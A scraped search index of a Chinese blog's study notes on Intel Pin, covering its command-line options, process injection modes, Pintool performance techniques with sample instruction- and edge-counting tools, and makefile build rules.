3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"6.1 Pin Cmdline Options 如下是Pin的命令行的完整option列表： Option Description -follow_execv 使用Pin执行由execv类系统调用产生的所有进程 -help 帮助信息 -pause_tool 暂停并打印PID以可以在tool加载后attach到debugger，处理过程在‘n’秒后重启 -logfile 指定log文件的名字和路径，默认路径为当前工作目录，默认文件名为pin.log -unique_logfile 添加pid到log文件名中 -error_file 指定error文件的名字和路径，默认路径为当前工作目录。如果设置了error文件，则所有error都会写入到文件中，并且不会在console中显示。如果没有指定，则不创建文件。 -unique_error_file 添加pid到error文件名中 -injection 的选项为dynamic， self， child， parent，只能在UNIX中使用，详看Injection，默认使用dynamic。 -inline 内联简单的分析routine -log_inline 在pin.log文件中记录哪些分析routine被设置成了内联 -cc_memory_size 最大代码缓存，字节为单位。0为默认值，表示不做限制。必须设置为代码缓存块大小的对齐倍数。 -pid \u003cpid #\u003e 使用Pin和Pintool attach一个正在运行的进程 -pin_memory_range 限制Pin到一个内存范围内，0x80000000:0x90000000 or size: 0:0x10000000. -restric_memory 阻止Pin的动态加载器使用该地址范围：0x10000000:0x20000000 -pin_memory_size 限制Pin和Pintool可以动态分配的字节数。Pin分配的字节数定义为Pin分配的内存页数乘以页大小。 -tool_load_option 加载有附加标志的tool。 -t 指定加载的Pintool。 -t64 \u003c64-bit toolname\u003e 指定针对Intel 64架构的64-bit的Pintool。 -p32 指定IA-32架构下的Pintool -p64 指定针对Intel 64架构的Pintool -smc-support 是否开启app的SMC功能，1开启，0关闭。默认开启 -smc_strict 是否开启基本块内部的SMC，1开始，0关闭。默认关闭 -appdebug 调试目标程序，程序运行后立即在debugger中断下 -appdebug_enable 开启目标程序调试功能，但是在程序运行后不暂停 -appdebug_silent 当程序调试功能开启时，Pin打印消息告知如何连接外部debugger。但是在-appdebug_connection选项开启时不打印。 -appdebug_exclude 当程序调试功能开启，并指定了-follw_execv时，默认在所有子进程上启用调试。 -appdebug_allow_remote 允许debugger与Pin不运行在同一系统上，而是以远程方式进行连接。指定 -appdebug_connection 时会忽略该选项的值，因为 -appdebug_connection 明确指定了运行debugger的machine。 -appdebug_connection 当程序开启调试时，Pin默认会开启一个TCP端口等待debugger的连接。在开启该选项时，会在debugger中开启一个TCP端口来等待Pin的连接，相当于反置了默认的机制。该选项的格式为\"[ip]:port\"，“ip”以点十进制格式表达，如果省略了ip，则会连接本地的端口，端口号为十进制表示。需要注意的是，debugger为GDB时，不使用该选项。 -detach_reattach 允许在probe模式下进行detach和reattach，仅在Windows平台下使用。 -debug_instrumented_processes 允许debugger对经过插桩的进程进行attach，仅在Windows平台下使用。 -show_asserts 健全性检查 此外，还支持如下的tool options，它们需要跟在tool名字后面，但是要在--符号前： Option Description -logifle 指定log文件的名字和路径，默认路径为当前工作目录，默认文件名为pintool.log -unique_logfile 添加pid到log文件名中 -discard_line_info \u003cmodule_name\u003e 忽略特定模块的信息，模块名应该为没有路径的短文件名，不能是符号链接 -discard_line_info_all 忽略所有模块的信息 -help 帮助信息 -support_jit_api 启用托管平台支持 -short_name 使用最短的RTN名称。 -symbol_path 指定用分号分隔的路径列表，用于搜索以查找符号和行信息。仅在Windows平台下使用。 -slow_asserts 健全性检查 ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:3:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"6.2 Instrumenting Applications on Intel(R) 64 Architectures IA-32和Intel(R) 64架构的Pin kit是一个组合kit，均包含32-bit和64-bit的版本。这就为复杂的环境提供了极高的可运行性，例如一个稍微有点复杂的运行如下： pin [pin-option]... -t64 \u003c64-bit toolname\u003e -t \u003c32-bit toolname\u003e [tool-options]... -- \u003capplication\u003e [application-option].. 需要注意的是： -t64选项需要用在-t选项的前面 当-t64和-t一起使用时，-t后面跟的时32-bit的tool。不推荐使用不带-t的-t64，因为在这种情况下，当给定32-bit应用程序时，Pin将在不应用任何工具的情况下运行该应用程序。 [tool-option]会同时作用于64-bit和32-bit的tool，并且必须在-t \u003c32-bit toolname\u003e后面进行指定。 ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:3:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"6.3 Injection 选项-injection仅在UNIX平台下可以使用，该选项控制着Pin注入到目标程序进程的方式。 默认情况下，建议使用dynamic模式。在该模式下，使用的是对父进程注入的方式，除非是系统内核不支持。子进程注入方式会创建一个pin的子进程，所以会看到pin进程和目标程序进程同时运行。使用父进程注入方式时，pin进程会在注入完成后退出，所以相对来说比较稳定。在不支持的平台上使用父进程注入方式可能出现意料之外的问题。 ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:3:3","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"7. Writing a Pintool ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:4:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"7.1 Logging Messages from a Pintool Pin提供了将Pintool的messages写入到文件的机制——LOG() api，在合适的获取message的位置使用即可。默认的文件名为pintool.log，存储路径为当前工作目录，可以使用-logfile选项来改变log文件的路径和名字。 LOG( \"Replacing function in \" + IMG_Name(img) + \"\\n\" ); LOG( \"Address = \" + hexstr( RTN_Address(rtn)) + \"\\n\" ); LOG( \"Image ID = \" + decstr( IMG_Id(img) ) + \"\\n\" ); ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:4:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"7.2 Performance Considerations When Writing a Pintool Pintool的开发质量会很大程度上决定tool的性能如何，例如在进行插桩时的速度问题。将通过一个例子来介绍一些提高tool性能的技巧。 首先是插桩部分代码： VOID Instruction(INS ins, void *v) { ... if ( [ins is a branch or a call instruction] ) { INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR) docount2, IARG_INST_PTR, IARG_BRANCH_TARGET_ADDR, IARG_BRANCH_TAKEN, IARG_END); } ... } 然后是分析代码： VOID docount2( ADDRINT src, ADDRINT dst, INT32 taken ) { if(!taken) return; COUNTER *pedg = Lookup( src,dst ); pedg-\u003e_count++; } 该工具的目的是计算控制流图中每个控制流变化的边界被遍历的频率。工作原理如下：插桩组件通过调用docount2对每个分支进行插桩。传入的参数为源分支和目标分支以及分支是否被执行。源分支和目标分支代表来控制流边界的源和目的。如果没有执行分支，控制流不会发生改变，因此分析routine会立即返回。如果执行了分支，就使用src和dst参数来查找与此边界相关的计数器，并增加计数器的值。 Shifting Computation for Analysis to Instrumentation Code 在一个典型的应用程序中，大概每5条指令构成一个分支，在这些指令执行时会调用Lookup函数，造成性能下降。我们思考这个过程可以发现，在指令执行时，每条指令只会调用一次插桩代码，但会多次调用分析代码。所以，可以想办法将计算工作从分析代码转移到插桩代码，这样就可以降低调用次数，从而提升性能。 首先，就大多数分支而言，我们可以在Instruction()中找到目标分支。对于这些分支，我们可以在Instruction()内部调用Lookup()而不是docount2()，对于相对较少的间接分支，我们仍然需要使用原来的方法。 因此，我们增加一个新的函数docount，原来的docount2函数保持不变： VOID docount( COUNTER *pedg, INT32 taken ) { if( !taken ) return; pedg-\u003e_count++; } 相应地，修改插桩函数： VOID Instruction(INS ins, void *v) { ... if (INS_IsDirectControlFlow(ins)) { COUNTER *pedg = Lookup( INS_Address(ins), INS_DirectControlFlowTargetAddress(ins) ); INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR) docount, IARG_ADDRINT, pedg, IARG_BRANCH_TAKEN, IARG_END); } else { INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR) docount2, IARG_INST_PTR, IARG_BRANCH_TARGET_ADDR, IARG_BRANCH_TAKEN, IARG_END); } ... } 在插桩函数内部根据不同的情况，执行不同的分析代码，避免对所有类型的指令都笼统地调用性能要求高docount2 函数。 最终实现的完整代码如下： /*! @file * This file contains an ISA-portable PIN tool for tracing instructions */ #include \u003ciostream\u003e#include \u003cfstream\u003e#include \u003cmap\u003e#include \u003cunistd.h\u003e#include \"pin.H\"using std::cerr; using std::endl; using std::map; using std::pair; using std::string; /* ===================================================================== */ /* Commandline Switches */ /* ===================================================================== */ KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"edgcnt.out\", \"specify trace file name\"); KNOB\u003c INT32 \u003e KnobFilterByHighNibble(KNOB_MODE_WRITEONCE, \"pintool\", \"f\", \"-1\", \"only instrument instructions with a code address matching the filter\"); KNOB\u003c BOOL \u003e KnobPid(KNOB_MODE_WRITEONCE, \"pintool\", \"i\", \"0\", \"append pid to output\"); /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ static INT32 Usage() { cerr \u003c\u003c \"This pin tool collects an edge profile for an application\\n\"; cerr \u003c\u003c \"The edge profile is partial as it only considers control flow changes (taken\\n\"; cerr \u003c\u003c \"branch edges, etc.). It is the left to the profile consumer to compute the missing counts.\\n\"; cerr \u003c\u003c \"\\n\"; cerr \u003c\u003c \"The pin tool *does* keep track of edges from indirect jumps within, out of, and into\\n\"; cerr \u003c\u003c \"the application. Traps to the OS a recorded with a target of -1.\\n\"; cerr \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Global Variables */ /* ===================================================================== */ class COUNTER { public: UINT64 _count; // 边界到达的次数，计数器 COUNTER() : _count(0) {} }; typedef enum { ETYPE_INVALID, ETYPE_CALL, ETYPE_ICALL, ETYPE_BRANCH, ETYPE_IBRANCH, ETYPE_RETURN, ETYPE_SYSCALL, ETYPE_LAST } ETYPE; class EDGE { public: ADDRINT _src; ADDRINT _dst; ADDRINT _next_ins; ETYPE _type; // 必须为整数形式 EDGE(ADDRINT s, ADDRINT d, ADDRINT n, ETYPE t) : _src(s), _dst(d), _next_ins(n), _type(t) {} bool operator\u003c(const EDGE\u0026 edge) const { return _src \u003c edge._src || (_src == edge._src \u0026\u0026 _dst \u003c edge._dst); } }; string StringFromEtype(ETYPE etype) { switch (etype) { case ETYPE_CALL: return \"C\"; case ETYPE_ICALL: return \"c\"; case ETYPE_BRANCH: return \"B\"; case ETYPE_IBRANCH: return \"b\"; case ETYPE_RE","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:4:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"7.3 Eliminating Control Flow 上面新增的docunt()函数的代码十分简洁，极大地提升了性能。除此之外，还可以被Pin内联，进一步避免函数调用的开销。 但是现在的docount()函数中存在控制流，这有可能在进行内联时发生未知的改变。最好的解决办法是去掉函数中的控制流，这样进行内联时可以保证健壮性。 考虑到docount()函数的’taken’参数要么为0，要么为1，所以可以将函数代码修改为如下： VOID docount( COUNTER *pedg, INT32 taken ) { pedg-\u003e_count += taken; } 如此修改后，docunt()函数就可以进行内联了，并且可以保证函数的健壮性。 ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:4:3","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"7.4 Letting Pin Decide Where to Instrument 在某些情况下，我们不关心具体在什么位置进行插桩，只要保证插桩代码位于基本块内部即可。在这种情况下，我们可以将插桩位置的选择权交给Pin自身，Pin可以选择需要最少寄存器进行保存和恢复的插入点，提升性能。 一个样例如下： #include \u003ciostream\u003e#include \u003cfstream\u003e#include \"pin.H\"using std::cerr; using std::endl; using std::ios; using std::ofstream; using std::string; ofstream OutFile; // 记录运行的指令的数量，设置为静态变量方便编译器优化docount函数 static UINT64 icount = 0; // 在每个块之前调用该函数 // 对calls使用fast linkage VOID PIN_FAST_ANALYSIS_CALL docount(ADDRINT c) { icount += c; } // Pin在遇到一个新块时调用，插入对docount 函数的调用 VOID Trace(TRACE trace, VOID* v) { // 检查trace中的每个基本块 for (BBL bbl = TRACE_BblHead(trace); BBL_Valid(bbl); bbl = BBL_Next(bbl)) { // 对每个bbl插入对docount函数的调用，将指令数量作为参数传递 // IPOINT_ANYWHERE参数允许Pin在bbl内部任意位置插入call以获取最好的性能 // 对call使用fast linkage BBL_InsertCall(bbl, IPOINT_ANYWHERE, AFUNPTR(docount), IARG_FAST_ANALYSIS_CALL, IARG_UINT32, BBL_NumIns(bbl), IARG_END); } } KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"inscount.out\", \"specify output file name\"); // 程序退出时调用 VOID Fini(INT32 code, VOID* v) { OutFile.setf(ios::showbase); OutFile \u003c\u003c \"Count \" \u003c\u003c icount \u003c\u003c endl; OutFile.close(); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool counts the number of dynamic instructions executed\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // 初始化Pin if (PIN_Init(argc, argv)) return Usage(); OutFile.open(KnobOutputFile.Value().c_str()); // 注册插桩函数Trace TRACE_AddInstrumentFunction(Trace, 0); // 注册Fini函数 PIN_AddFiniFunction(Fini, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } 这里IPOINT是一个枚举类型，决定了分析call被插入到什么地方。插入的对象可以是：INS，BBL，TRACE，RTN，其完整可用的值如下： IPOINT_BEFORE：在插桩对象的第一条指令之前插入call，总是有效 IPOINT_AFTER：在插桩对象的最后一条指令的失败路径处插入call 如果是routine（RTN），在所有返回路径处插桩 如果是instruction（INS），仅在INS_IsValidForIpointAfter()函数为真的情况下适用 如果是BBL，仅在BBL_HasFallThrough()函数为真的情况下适用 如果是TRACE，仅在TRACE_HasFallThrough()函数为真的情况下适用 IPOINT_ANYWHERE：在插桩对象的任意位置插入call，不适用INS_InsertCall()和INS_InsertThenCall()函数 IPOINT_TAKEN_BRANCH：在插桩对象的控制流的执行边界处插入call，仅适用于INS_IsValidForIpointTakenBranch()返回真的情况。 ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:4:4","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"7.5 Using Fast Call Linkages 对于一些比较“小”的函数来说，对函数的调用开销有时与函数自身的运算开销基本相同，因此一些编译器会提供一些调用链接优化机制来降低开销。例如，IA-32下的gcc有一个在寄存器中传递参数的regparm属性。 Pin中有一定数量的备用链接，使用PIN_FAST_ANALYSIS_CALL来声明分析函数即可使用，而插桩函数InsertCall则需要使用IARG_FAST_ANALYSIS_CALL。如果二者只更改了一个，那么就可能出现传参错误。例如前面给出的源码例子就使用了fast call linkages： ... ... // 对分析函数使用fast linkage VOID PIN_FAST_ANALYSIS_CALL docount(ADDRINT c) { icount += c; } VOID Trace(TRACE trace, VOID* v) { // 检查trace中的每个基本块 for (BBL bbl = TRACE_BblHead(trace); BBL_Valid(bbl); bbl = BBL_Next(bbl)) { // 对插桩函数使用fast linkage BBL_InsertCall(bbl, IPOINT_ANYWHERE, AFUNPTR(docount), IARG_FAST_ANALYSIS_CALL, IARG_UINT32, BBL_NumIns(bbl), IARG_END); } } ... ... 在对比较复杂的大型函数使用该方法时，效果并不明显，但不会造成性能的下降。 第二个调用链接优化是消除帧指针。如果使用gcc，则推荐加上\"-fomit-frame-pointer\"选项。Pin官方的标准Pintool的makefile包括该选项。与PIN_FAST_ANALYSIS_CALL一样，该选项对“小”函数的效果比较明显。需要注意的是，debugger会根据帧指针来显示堆栈回溯情况，所以如果想调试Pintool的话，就不要设置该选项。如果使用标准的Pintool的makefile来进行变异，则可以通过修改OPT选项来进行改变： make OPT=-O0 ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:4:5","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"7.6 Rewriting Conditional Analysis Code to Help Pin Inline Pin通过自动内联没有控制流变化的分析routine来提升插桩性能。但是有很多分析routine是有控制流的，最典型的就是有一个简单的“if-then”的条件语句，它只会执行少量的分析代码，并“then”部分只执行一次。为了将这类的语句转换为常规的没有控制流变化的语句，Pin提供了一些插桩API来重写分析routine。下面是一个重写的例子： 例如我们当前想要实现的一个分析routine的代码如下： // IP-sampling分析routine实现: VOID IpSample(VOID *ip) { --icount; if (icount == 0) { fprintf(trace, \"%p\\n\", ip); icount = N + rand() % M; } } 在原始的IpSample()函数中有一个明显的条件语句，会存在控制流的变化。如何消除该条件控制流的存在呢？ 可以看到分析routine内部其实可以拆解为2部分功能：icount的自减和“if”语句，那么可以使用两个单独的函数实现。而且，前者比后者的执行频率要更高。拆解后的代码如下： /* * IP-sampling分析routine实现: * * VOID IpSample(VOID *ip) * { * --icount; * if (icount == 0) * { * fprintf(trace, \"%p\\n\", ip); * icount = N + rand() % M; * } * } */ // 计算icount ADDRINT CountDown() { --icount; return (icount == 0); } // 打印当前指令的IP并且icount被重置为N和N+M中的一个随机数 VOID PrintIp(VOID* ip) { fprintf(trace, \"%p\\n\", ip); // 准备下次计算 icount = N + rand() % M; } 一个完整的实现消除控制流变化的代码如下： /* source/tools/ManualExamples/isampling.cpp */ #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \"pin.H\"FILE* trace; const INT32 N = 100000; const INT32 M = 50000; INT32 icount = N; /* * IP-sampling分析routine实现: * * VOID IpSample(VOID *ip) * { * --icount; * if (icount == 0) * { * fprintf(trace, \"%p\\n\", ip); * icount = N + rand() % M; * } * } */ // 计算icount ADDRINT CountDown() { --icount; return (icount == 0); } // 打印当前指令的IP并且icount被重置为N和N+M中的一个随机数 VOID PrintIp(VOID* ip) { fprintf(trace, \"%p\\n\", ip); // 准备下次计算 icount = N + rand() % M; } VOID Instruction(INS ins, VOID* v) { // 每条指令执行后都会调用CountDown() INS_InsertIfCall(ins, IPOINT_BEFORE, (AFUNPTR)CountDown, IARG_END); // 只有当CountDown返回非0值时才会调用PrintIp() INS_InsertThenCall(ins, IPOINT_BEFORE, (AFUNPTR)PrintIp, IARG_INST_PTR, IARG_END); } VOID Fini(INT32 code, VOID* v) { fprintf(trace, \"#eof\\n\"); fclose(trace); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { PIN_ERROR(\"This Pintool samples the IPs of instruction executed\\n\" + KNOB_BASE::StringKnobSummary() + \"\\n\"); return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { trace = fopen(\"isampling.out\", \"w\"); if (PIN_Init(argc, argv)) return Usage(); INS_AddInstrumentFunction(Instruction, 0); PIN_StartProgram(); return 0; } 使用条件插桩API INS_InsertIfCall()和INS_InsertThenCall()来告诉Pin只有当CountDown()执行结果非0时，才执行PrintIp()。这样一来，CountDown()函数就可以内联在Pin中，对于没有内联的PrintIp()则只有在满足条件时才会执行一次。 INS_InsertThenCall()插进去的函数只有在INS_InsertIfCall()插进去的函数返回非0值时才会执行。这个功能可以说是一个十分巧妙的功能。 ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:4:6","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"8. Building Your Own Tool 在开发自己的Pintool时，可以copy一份example目录， 然后在makefile.rules文件中添加上自己的tool，可以以最简单的MyPinTool为模版。 ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:5:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"8.1 Building a Tool From Within the Kit Directory Tree 如果直接修改MyPinTool，并且没有特殊的编译需求，则直接使用默认配置就好。如果要新增tool或者需要指定特殊的构建标志，则需要修改makeifile.rules文件。 构建YourTool.so(源文件为YourTool.cpp)： make obj-intel64/YourTool.so 如果想编译成IA-32架构，则使用“obj-ia32”替换“obj-intel64”即可。 ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:5:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"8.2 Building a Tool Out of the Kit Directory Tree copy文件夹MyPinTool到指定位置子，然后编辑makefile.rules文件。 make PIN_ROOT=\u003cpath to Pin kit\u003e obj-intel64/YourTool.so 要更改将创建工具的目录，可以从命令行覆盖 OBJDIR 变量： make PIN_ROOT=\u003cpath to Pin kit\u003e OBJDIR=\u003cpath to output dir\u003e \u003cpath to output dir\u003e/YourTool.so ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:5:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"9. Pin’s makefile Infrastructure ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:6:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"9.1 The Config Directory 目录source/tools/Config中存放了make配置的基本文件，不要轻易修改这些文件，可以基于其中的模版文件进行更新。 下面对其中的几个关键文件进行说明： makefile.config：在include链中第一个应该include的文件。它保存了用户可用的所有相关标识和变量的文档，此外还包括特定于OS的配置文件。 unix.vars：该文件包含makefile使用的一些架构变量和实用程序的Unix定义。 makefile.default.rules：该文件包含默认的make目标、测试用例和构建规则。 ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:6:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"9.2 The Test Directories source/tools目录下的每个测试性质的目录中都包含makefile链中的两个文件： makefile：运行make时调用，不要修改。其中保存了makefile链的所有相关配置文件的包含指令，属于通用文件，在所有的测试目录中都是相同的。 makefile.rules：目录特定文件，不同测试目录，文件内容不同。它保存了当前目录的逻辑，应该在目录中构建和运行的所有工具、应用程序和测试等都在该文件中进行定义。 ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:6:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"9.3 Adding Tests, Tools and Applications to the makefile 下面介绍如何通过makefile构建二进制程序并运行测试。以下描述的变量都在makefile.rules文件的\"Test targets\"部分进行描述： TOOL_ROOTS：定义工具名称，不带文件扩展名，具体的文件扩展名将由make自动添加，例如YourTools.so； APP_ROOTS：定义应用程序，不带文件扩展名，具体的文件扩展名将由make自动添加，例如YourApp.exe； TEST_ROOTS：定义测试，不要加.test后缀，make会自动添加，例如YourTest.test。 ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:6:3","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"9.4 Defining Build Rules for Tools and Applications 默认使用的构建规则是source/tools/Config/makefile.default.rules，输入为单一的c/cpp文件，生成相同名字的二进制程序。如果输入为多个源文件，且需要自定义构建规则，可以在make.rules文件的\"Build rules\"部分的末尾添加。如下是规则例子： 构建单一源文件且不进行优化： # Build the intermediate object file. $(OBJDIR)YourTool$(OBJ_SUFFIX): YourTool.cpp $(CXX) $(TOOL_CXXFLAGS_NOOPT) $(COMP_OBJ)$@ $\u003c # Build the tool as a dll (shared object). $(OBJDIR)YourTool$(PINTOOL_SUFFIX): $(OBJDIR)YourTool$(OBJ_SUFFIX) $(LINKER) $(TOOL_LDFLAGS_NOOPT) $(LINK_EXE)$@ $\u003c $(TOOL_LPATHS) $(TOOL_LIBS) 构建多源文件且进行优化： # Build the intermediate object file. $(OBJDIR)Source1$(OBJ_SUFFIX): Source1.cpp $(CXX) $(TOOL_CXXFLAGS) $(COMP_OBJ)$@ $\u003c # Build the intermediate object file. $(OBJDIR)Source2$(OBJ_SUFFIX): Source2.c Source2.h $(CC) $(TOOL_CXXFLAGS) $(COMP_OBJ)$@ $\u003c # Build the tool as a dll (shared object). $(OBJDIR)YourTool$(PINTOOL_SUFFIX): $(OBJDIR)Source1$(OBJ_SUFFIX) $(OBJDIR)Source2$(OBJ_SUFFIX) Source2.h $(LINKER) $(TOOL_LDFLAGS_NOOPT) $(LINK_EXE)$@ $(^:%.h=) $(TOOL_LPATHS) $(TOOL_LIBS) ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:6:4","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"9.5 Defining Test Recipes in makefile.rules 在\"Test recipes\"部分自定义自己的测试需求，例如： YourTest.test: $(OBJDIR)YourTool$(PINTOOL_SUFFIX) $(OBJDIR)YourApp$(EXE_SUFFIX) $(PIN) -t $\u003c -- $(OBJDIR)YourApp$(EXE_SUFFIX) ","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:6:5","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"9.6 Useful make Variables and Flags 摘取makefile.config中几个重点的标志进行说明： IN_ROOT：在套件外构建工具时指定Pin套件的位置。 CC: 指定工具的默认c编译器。 CXX：指定工具的默认c++编译器 APP_CC：指定应用程序的默认 c 编译器。如果未定义，APP_CC 将与 CC 相同。 APP_CXX：指定应用程序的默认 c++ 编译器。如果未定义，APP_CXX 将与 CXX 相同。 TARGET：指定默认目标架构，例如交叉编译。 ICC: 使用英特尔编译器构建工具时指定 ICC=1。 DEBUG: 当指定 DEBUG=1 时，在构建工具和应用程序时会生成调试信息。此外，不会执行任何编译和/或链接优化。 